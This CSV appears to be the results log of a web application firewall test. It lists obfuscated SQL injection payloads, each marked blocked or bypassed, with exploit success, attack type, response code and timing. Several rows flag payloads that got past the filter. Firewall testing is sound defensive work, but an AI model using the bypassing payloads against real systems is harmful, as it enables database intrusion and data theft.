Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=.1+||+not+{`if`%0b1}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0144,70.88,No,500
0'<@=1.%0b||+not%0b{x+(select%0b1)}=1=+(!+true)+or%27,Bypassed,No,None,booleanAtk,0.013,70.88,No,500
0'<@=.1+||+!+{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Blocked,No,None,Unknown,0.0056,70.88,No,403
0%27<@=1+or+not+true=%0b(!+1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0189,70.88,No,200
0'<@=.1+||%0b!+true=+(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,booleanAtk,0.0205,70.88,No,500
0%27<@!=1.%0bor+not%0b{`if`+1}=1=+(!%0btrue)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0139,70.88,No,200
0%27<@!=1%0bor+!+{`if`+1}=1=%0b(!%7e0)+or',Bypassed,No,None,Unknown,0.0195,70.88,No,500
0%27<@=1.+||+not+{a+1}=1=+(not+{x+(select+1)}=1)+,Blocked,No,None,Unknown,0.0076,70.88,No,403
0%27<@!=.1%0b||%0bnot%0b{a%0b1}=1=+(!+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0278,71.08,No,500
0%27<@=.1+||+not~false=+(!+{x+(select%0b1)}=1)+||',Blocked,No,None,Unknown,0.0149,71.28,No,403
0'<@!=1.%0bor+!%0b1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0337,71.28,No,500
0'<@=.1+||%0b{a+1}=1%0blike+true+||%27,Bypassed,No,None,Unknown,0.0238,69.78,No,500
0%27<@=1+||+!%0b{x+(select%0b1)}=1=+(not+1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0167,70.38,No,200
0%27<@=.1+||%0bnot%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0085,70.38,No,200
0%27||%0b@<@.+||%0bnot~false=%0b(0)+or',Bypassed,No,None,booleanAtk,0.0094,70.38,No,500
0'<@=.1+||%0b!%7e0=%0b(!+{a%0b1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0138,70.44,No,500
0'<@=.1%0bor%0b!+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0124,70.5,No,500
0'<@=.1%0bor%0b!+{x+(select%0b1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Unknown,0.0197,70.56,No,500
0'<@=.1+or+!%0btrue=%0b(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,booleanAtk,0.0103,70.63,No,500
0%27<@=1.%0bor+!+{a+1}=1=+(false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0222,70.63,No,200
0'<@!=.1+||%0bnot%0btrue=+(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.021,70.88,No,403
0%27<@=1+||%0bnot+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0067,70.88,No,403
0'<@=.1%0bor%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0183,70.88,No,500
0'<@=.1+||%0bnot%0b{`if`+1}=1=+(not+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0142,70.88,No,500
0%27<@=1%0bor+!+true=+(!%0btrue)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0162,70.88,No,200
0%27<@=1.%0b||+not+{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0131,70.88,No,200
0%27<@=.1+or+{x%0b(select+1)}=1%0blike%0b{a+1}=1+or',Bypassed,No,None,Unknown,0.0219,70.88,No,500
0%27<@!=1+||+!%0b{x%0b(select%0b1)}=1=%0b(not+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0119,70.88,No,200
0'<@=.1%0bor+!+{x%0b(select+1)}=1=+(not+{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.021,70.88,No,500
0%27<@!=1%0bor%0b!%0b{`if`+1}=1=+(!%0btrue)%0b||',Bypassed,No,None,booleanAtk,0.0225,70.88,No,500
0'<@=.1+||%0b!%0b{x+(select%0b1)}=1=%0b(false)%23,Blocked,No,None,piggyAtk,0.0085,70.88,No,403
0'<@!=1.%0b||%0b{`if`%0b1}=1%0blike+{x+(select%0b1)}=1+or%27,Bypassed,No,None,Unknown,0.0176,70.88,No,500
0%27<@!=.1%0b||+!%0b1=+(not%0b{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0105,70.88,No,500
0'<@=.1+or+{a%0b1}=1+like+1%0b||',Blocked,No,None,Unknown,0.0085,70.88,No,403
0'<@=1.+||%0b!+1=%0b(not%0b{x%0b(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0119,70.88,No,500
0%27<@=.1+or+!%7efalse=%0b(!%0b1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0093,70.88,No,200
0%27<@!=1.%0b||%0b!~false=%0b(!+{`if`+1}=1)+or',Bypassed,No,None,booleanAtk,0.0074,70.88,No,500
0'<@=1.%0b||+not%0b{x%0b(select%0b1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Unknown,0.0126,70.88,No,500
0%27<@!=.1%0b||+false=%0b(!+{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0257,70.88,No,200
0%27<@=1.+or+!+{a+1}=1=+(false)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0131,70.88,No,200
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0124,70.88,No,500
0%27<@=.1+or%0bnot+{`if`%0b1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0089,70.88,No,500
0%27<@!=1+||+!%0b{`if`%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0098,70.88,No,200
0%27or+1<@.%0bor%0b{x+(select+1)}=1+like%0b{`if`+1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0229,70.88,No,200
0%27<@=.1+||%0b1%0blike%0b{a%0b1}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0116,70.88,No,200
0'<@=1%0bor+not%0b{a%0b1}=1=+(false)+||%27,Bypassed,No,None,booleanAtk,0.0119,70.88,No,500
0'<@=1.%0bor+not%0b{a%0b1}=1=%0b(!+{x+(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0096,70.88,No,500
0'<@=.1+||+not+{a+1}=1=+(!%0b{a+1}=1)+||',Bypassed,No,None,Unknown,0.0141,70.88,No,500
0'<@!=1%0bor+not+{x+(select+1)}=1=%0b(!+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0095,70.88,No,500
0%27<@!=1.%0bor+{x+(select+1)}=1%0blike%0b{x+(select+1)}=1+or',Bypassed,No,None,Unknown,0.0178,70.88,No,500
0%27<@!=1.%0bor%0b!%0b1=+(not~0)+or',Bypassed,No,None,Unknown,0.0137,70.88,No,500
0'<@=1+||+not+{`if`+1}=1=%0b(0)%0b||%27,Bypassed,No,None,Unknown,0.0123,70.88,No,500
0%27<@=1.%0bor%0bnot+{`if`%0b1}=1=+(not+{x%0b(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0161,70.88,No,200
0%27<@!=1.+or+!+1=%0b(!~false)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0163,70.88,No,200
0'<@=1.+||%0b!+{x+(select+1)}=1=%0b(!%0b{a+1}=1)--,Blocked,No,None,piggyAtk,0.012,70.88,No,403
0'<@!=.1+||+!+{`if`+1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0123,70.88,No,500
0%27<@=1.+or+not%0b{`if`%0b1}=1=+(!%7efalse)+||',Bypassed,No,None,booleanAtk,0.011,70.88,No,500
0%27<@!=1+or+not+1=+(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0236,70.88,No,500
0%27<@=1.%0b||+!%0b{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0101,70.88,No,200
0'<@!=.1%0bor%0bnot%0b{a%0b1}=1=+(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0142,71.08,No,500
0%27<@=.1+||+not+{x+(select+1)}=1=%0b(not%0b{a%0b1}=1)+,Blocked,No,None,Unknown,0.005,71.28,No,403
0'<@=1+||%0bnot+{x+(select+1)}=1=%0b(not+true)+or',Blocked,No,None,booleanAtk,0.0136,69.78,No,403
0'<@=.1%0bor+!+{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0172,70.38,No,500
0%27<@=.1+||+not+{`if`%0b1}=1=+(!%7e0)%0b||',Bypassed,No,None,Unknown,0.0183,70.38,No,500
0'<@!=.1+or%0b!+{`if`%0b1}=1=+(false)%0b||%27,Bypassed,No,None,booleanAtk,0.0168,70.38,No,500
0'<@=1.%0b||+!+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0131,70.44,No,500
0'<@!=1%0bor%0bfalse=+(not+{x+(select+1)}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0107,70.5,No,500
0%27<@=1.+or%0bnot+{a+1}=1=%0b(0)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0194,70.63,No,200
0'<@!=1.%0bor%0b!+{x%0b(select%0b1)}=1=+(false)+||%27,Bypassed,No,None,booleanAtk,0.012,70.75,No,500
0'<@!=1.+||%0b0=+(not+1)%23,Blocked,No,None,piggyAtk,0.0105,70.88,No,403
0%27or%0b@<@+or+!%0b{x+(select+1)}=1=%0b(not%0b{a%0b1}=1,Blocked,No,None,Unknown,0.0054,70.88,No,403
0'<@=1.+||%0bnot%0b{x+(select+1)}=1=%0b(!%7efalse)%0b||%27,Blocked,No,None,Unknown,0.0194,70.88,No,403
0%27<@=1.+or%0bnot%0b{`if`%0b1}=1=%0b(!+{a+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0182,70.88,No,200
0'<@=1+||+!+{a+1}=1=+(not+{x+(select%0b1)}=1)%0b,Blocked,No,None,Unknown,0.0129,70.88,No,403
0'<@!=1.+or+not%0b{x%0b(select%0b1)}=1=%0b(not%0b{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0205,70.88,No,500
0'<@!=.1+||+{x+(select+1)}=1%0blike%0b{a+1}=1--+,Blocked,No,None,piggyAtk,0.0062,70.88,No,403
0%27or+1<@.+or+!%7e0=%0b(!+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.007,70.88,No,500
0'<@=1.+||+not%0b1=%0b(not%0btrue)+||%27,Bypassed,No,None,Unknown,0.0139,70.88,No,500
0'<@!=1.+||%0bnot~false=+(0)+||',Blocked,No,None,Unknown,0.0281,70.88,No,403
0%27or+@<@.+or+!+{`if`%0b1}=1=%0b(not%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0077,70.88,No,200
0%27<@!=.1+or%0bnot~0=+(not+{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0236,70.88,No,200
0'<@=.1+or%0bnot%0btrue=%0b(not%0b{`if`+1}=1)+or',Blocked,No,None,booleanAtk,0.0182,70.88,No,403
0'<@=.1+||+false=+(0)--%0b,Blocked,No,None,piggyAtk,0.0125,70.88,No,403
0'<@=1+||+not+{x%0b(select+1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0114,70.88,No,500
0%27<@=1+or+!%0b{a%0b1}=1=+(not%0b{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0114,70.88,No,500
0'<@!=1.%0b||+not%0b{x%0b(select+1)}=1=+(not%0b{a+1}=1)--,Bypassed,No,None,piggyAtk,0.0106,70.88,No,500
0'<@!=1+||%0b!+{x+(select+1)}=1=+(not%7efalse)+or%27,Blocked,No,None,booleanAtk,0.0137,70.88,No,403
0%27<@=1.%0b||+!+{x%0b(select%0b1)}=1=+(!%0b{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,70.88,No,200
0%27<@!=1.+||%0bnot%0b{x+(select+1)}=1=+(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0178,70.88,No,403
0%27<@=1.+or+false=+(not+{a+1}=1)--%0b,Blocked,No,None,piggyAtk,0.0055,70.88,No,403
0%27<@!=.1+or%0bnot%0b{`if`%0b1}=1=+(!+{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0107,70.88,No,200
0%27or+1<@.%0bor%0b!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.031,70.88,No,200
0'<@=1+or+not+1=%0b(!%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.0076,70.88,No,500
0%27<@!=.1+||+!+{a+1}=1=%0b(not+{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0077,70.88,No,200
0'<@!=.1+or+!+{`if`%0b1}=1=+(not+1)%0b||',Bypassed,No,None,Unknown,0.0198,70.88,No,500
0'<@=1.%0bor%0bnot~false=%0b(!+true)+||%27,Bypassed,No,None,booleanAtk,0.0126,70.88,No,500
0'<@!=1%0bor+!+{`if`+1}=1=+(!+{x%0b(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0129,70.88,No,500
0%27<@=1+or+not%0b{x%0b(select%0b1)}=1=+(!%0btrue)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0132,70.88,No,200
0'||+@<@.%0bor%0b{x+(select+1)}=1%0blike%0b{x%0b(select+1)}=1+||',Bypassed,No,None,Unknown,0.008,70.88,No,500
0'or+1<@%0b||%0b!+{x+(select+1)}=1=+(not%0b{x+(select,Blocked,No,None,Unknown,0.0187,70.88,No,403
0%27<@!=.1+or+not+1=%0b(!+1)%0bor',Bypassed,No,None,Unknown,0.0144,70.88,No,500
0%27<@!=1+or+not+{x+(select%0b1)}=1=%0b(!~0)+or',Blocked,No,None,Unknown,0.0051,70.88,No,403
0%27<@!=1.%0b||%0b!%7efalse=+(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0115,70.88,No,500
0%27<@=1.+or+not%0b{x%0b(select+1)}=1=+(not+{a+1}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0096,70.88,No,200
0'<@!=1.+||+not+{a+1}=1=+(false)+||',Blocked,No,None,Unknown,0.0106,70.88,No,403
0'<@=1%0bor%0b!%0btrue=+(!%0b{a%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0231,70.88,No,500
0'<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(not+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0074,70.88,No,500
0%27<@=1+or+not%0b{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,70.88,No,200
0%27<@=.1%0bor+not+{a+1}=1=+(!%0btrue)+or',Bypassed,No,None,booleanAtk,0.0148,70.88,No,500
0'<@=.1%0b||+not%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0143,71.28,No,500
0'<@=1.+or%0b!%7efalse=%0b(false)+||%27,Blocked,No,None,booleanAtk,0.0133,71.28,No,403
0%27<@!=1.+or%0b!%7efalse=%0b(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0109,70.16,No,500
0%27<@=1.%0bor%0bnot+{x+(select+1)}=1=+(0)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0172,70.38,No,200
0'<@=.1%0b||+!+{`if`%0b1}=1=%0b(!+{x+(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0192,70.38,No,500
0'<@!=1.+||+not%0b1=+(not%0b{`if`+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0166,70.38,No,500
0'<@!=.1+or+!+true=%0b(not%7e0)+or',Bypassed,No,None,booleanAtk,0.0211,70.44,No,500
0%27<@=1%0b||+!%0b{x%0b(select%0b1)}=1=+(!%0b1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0075,70.5,No,200
0'<@!=1.+||+not+true=+(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0157,70.63,No,500
0'<@=1.%0bor+not+{x+(select%0b1)}=1=%0b(!%7efalse)+||%27,Bypassed,No,None,booleanAtk,0.0159,70.75,No,500
0%27<@=1.+||+!%0b{a%0b1}=1=%0b(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0198,70.88,No,500
0%27<@!=1+||%0b!+{a+1}=1=+(not%0b{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0097,70.88,No,500
0'<@=.1+or+false=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0108,70.88,No,500
0%27<@=1+or%0bnot+{x+(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.0127,70.88,No,403
0'<@!=1%0bor+not+{a+1}=1=+(not~false)+or',Bypassed,No,None,booleanAtk,0.0112,70.88,No,500
0'<@!=1.+or+not%7efalse=+(not+{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0152,70.88,No,500
0%27<@=1%0bor+!%0b{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,70.88,No,200
0%27<@!=.1%0b||%0bnot%0b{`if`%0b1}=1=%0b(!+{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0168,70.88,No,200
0%27<@!=1%0b||%0bnot+1=+(not+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0091,70.88,No,200
0%27<@!=1%0b||+not%0b1%0bis%0bfalse%0b||',Bypassed,No,None,Unknown,0.0206,70.88,No,500
0%27<@=.1+or+false=+(not%0b1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.017,70.88,No,200
0'<@!=.1+or+not+{`if`+1}=1=+(not+{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0097,70.88,No,500
0%27<@=1%0b||+!~false=+(!%7e0)+||',Bypassed,No,None,Unknown,0.0232,70.88,No,500
0%27<@!=.1+||%0b!%0b{x+(select%0b1)}=1=+(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0069,70.88,No,403
0'<@!=1%0b||+not%0b{a+1}=1=+(not+true)+or',Bypassed,No,None,booleanAtk,0.017,70.88,No,500
0%27or%0b@<@.%0b||+not%0b{`if`%0b1}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0259,70.88,No,500
0%27<@=1.+or%0b!%0b{a%0b1}=1=+(!+1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0118,70.88,No,200
0%27<@=1.+||+not+1=%0b(!%0btrue)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0141,70.88,No,200
0%27<@=1%0b||+{`if`%0b1}=1+like+true%0b||',Bypassed,No,None,Unknown,0.0124,70.88,No,500
0'<@!=1+||%0b!%0b{x+(select+1)}=1=%0b(0)+||',Blocked,No,None,Unknown,0.0074,70.88,No,403
0'<@=.1%0b||+not%0b{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0165,70.88,No,500
0'||%0b1<@.+or+1%0blike%0b{`if`%0b1}=1+||%27,Bypassed,No,None,Unknown,0.0136,70.88,No,500
0'<@!=1+||+not+{x%0b(select%0b1)}=1=+(not+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0104,70.88,No,500
0%27<@!=1.+||+!+{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0121,70.88,No,200
0%27<@!=.1%0b||%0b{`if`+1}=1%0blike+{x%0b(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0129,70.88,No,500
0%27<@=1%0bor%0b!+{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,70.88,No,200
0%27<@!=1.+||+!%0b{x+(select+1)}=1=+(!+{a%0b1}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0108,70.88,No,200
0'<@!=1.%0b||+!%0b{x%0b(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0142,70.88,No,500
0'<@=.1%0b||%0b!%0b{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0142,70.88,No,500
0'<@=1.+or+not%0b{x%0b(select+1)}=1=%0b(!+true)+||%27,Bypassed,No,None,booleanAtk,0.0127,70.88,No,500
0'<@!=1%0b||+!%0b{x%0b(select+1)}=1=%0b(not%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0183,70.88,No,500
0%27<@!=1.%0bor+!+{x%0b(select+1)}=1=+(not%0b{a+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,70.88,No,200
0'<@!=.1+||+{a%0b1}=1%0blike%0b{`if`+1}=1+or%27,Bypassed,No,None,Unknown,0.0186,70.88,No,500
0%27<@=.1%0bor%0b!~false=+(!+{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0137,70.88,No,200
0'<@!=1+||+!+{x+(select+1)}=1=%0b(!%7efalse)+||',Blocked,No,None,Unknown,0.0143,70.88,No,403
0%27<@!=.1+||%0b{x+(select+1)}=1%0blike+{x+(select+1)}=1+||',Bypassed,No,None,Unknown,0.0168,70.88,No,500
0%27<@=1+or%0bnot%0b{x+(select+1)}=1=+(not+{a%0b1}=1)--,Blocked,No,None,piggyAtk,0.0121,70.88,No,403
0'<@=1.+or+!%7efalse=+(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0097,70.88,No,500
0%27<@!=1+||+not%0b{`if`%0b1}=1=+(0)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0138,71.08,No,200
0%27<@=1.+or%0b!%7efalse=+(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0101,71.28,No,500
0'<@!=1.+or+not%0b{x+(select+1)}=1=%0b(false)+||%27,Bypassed,No,None,booleanAtk,0.008,71.28,No,500
0%27<@=.1+or%0b!+{x+(select%0b1)}=1=+(not~false)+or%27,Blocked,No,None,booleanAtk,0.0238,71.28,No,403
0'<@=1.+||+{a%0b1}=1%0blike+{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0158,70.16,No,500
0'<@=1+or+!%0b{a%0b1}=1=%0b(not+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0107,70.38,No,403
0%27<@=1+||+not%0b{x%0b(select%0b1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0117,70.38,No,200
0'<@!=.1+or%0bnot+{`if`%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0189,70.38,No,500
0'<@=1.+||+{a+1}=1+like+{a+1}=1+or',Bypassed,No,None,Unknown,0.0143,70.44,No,500
0%27or+@<@.%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0202,70.56,No,200
0'<@=1+||%0b!+{`if`+1}=1=%0b(not+{x+(select%0b1)}=1)--,Bypassed,No,None,piggyAtk,0.0087,70.63,No,500
0%27<@!=.1%0b||%0b!%0b{x%0b(select+1)}=1=+(!+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0093,70.63,No,200
0%27<@=1.+or+not+{x%0b(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0289,70.75,No,200
0'<@!=.1+||+not~0=+(not%0b1)+||',Bypassed,No,None,Unknown,0.0227,70.88,No,500
0%27<@!=.1+or%0b!%0b{x+(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0132,70.88,No,403
0'<@!=1.%0bor+not%0b{a%0b1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0217,70.88,No,500
0%27<@=.1%0b||%0b!+{`if`+1}=1=%0b(!+{a%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0166,70.88,No,200
0%27<@!=1.%0b||%0bnot%0b{a+1}=1=+(not%7efalse)%0b||',Bypassed,No,None,Unknown,0.0093,70.88,No,500
0%27<@!=.1%0bor%0b!%0b1=%0b(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0173,70.88,No,200
0%27<@!=1.%0b||%0b!%0b{`if`+1}=1=%0b(!%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0095,70.88,No,200
0%27<@!=1%0b||+!+{x+(select+1)}=1=+(not+{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.017,70.88,No,200
0'<@=1.+||%0b!+{`if`%0b1}=1=+(not+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.009,70.88,No,500
0%27<@!=.1%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(!%7efalse)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.01,70.88,No,200
0'<@=1+||%0bnot%7efalse=%0b(not+{a%0b1}=1)--%0b,Blocked,No,None,piggyAtk,0.0156,70.88,No,403
0%27<@!=1.+||+!+{x+(select+1)}=1=%0b(false)%0b||',Blocked,No,None,Unknown,0.0094,70.88,No,403
0'<@!=1.+or%0bnot+{`if`%0b1}=1=+(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0144,70.88,No,500
0'<@=.1+||+!%0b{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0148,70.88,No,500
0%27<@=1.%0bor%0bnot%0b{a+1}=1=+(not+{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0137,70.88,No,200
0%27<@!=.1%0bor%0b!%0b{a%0b1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.01,70.88,No,200
0%27<@!=.1+or+!+{x+(select+1)}=1=%0b(not+{a%0b1}=1)+,Blocked,No,None,Unknown,0.0086,70.88,No,403
0'<@=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.011,70.88,No,500
0%27<@=1+||%0b{a+1}=1+like+1%0bor',Blocked,No,None,Unknown,0.01,70.88,No,403
0%27<@!=1.%0b||%0b!+{a+1}=1=%0b(not+{x+(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.01,70.88,No,200
0'<@=1%0bor+not+{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0133,70.88,No,500
0'<@!=1.+||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0179,70.88,No,500
0'<@!=1%0b||+not+{x%0b(select%0b1)}=1=+(not+true)%0b||',Bypassed,No,None,Unknown,0.008,70.88,No,500
